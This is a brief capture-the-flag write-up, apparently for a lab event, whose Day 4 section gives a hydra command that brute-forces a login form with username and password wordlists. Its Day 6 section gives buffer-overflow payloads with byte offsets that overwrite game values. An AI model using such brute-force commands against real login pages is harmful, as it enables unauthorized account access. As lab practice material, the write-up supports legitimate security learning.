# Not including the days with copy paste solutions

## Day 2

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/4c531c44-e8db-4bd0-9386-69eaf47d95a1)

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/55a7560a-da16-4b21-a40d-3c7139abce43)

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/df85fff5-553f-4b1f-ab72-42da868f0957)

## Day 4
Instead of using their wfuzz wordlist, I tried writing my own payload with hydra:

``` hydra -L usernames.txt  -P passwords.txt 10.10.229.119 http-post-form "/login.php:username=^USER^&password=^PASS^:Please enter the correct credentials" -V -f ```

## Day 6

Gold payload:
```AAAAAAAAAAAAXXXX```

Star payload:
```AAAAAAAAAAAAAAAAAAAAAAAAAAAAd```

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/bd55a709-e224-4462-9b88-402839baf887)

The offset to the gold is 12 bytes, the offset to the inventory is 28 bytes. We know the id of the star is "d" because of the shop.

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/681ab864-920c-4e48-af7b-90865cba8af2)
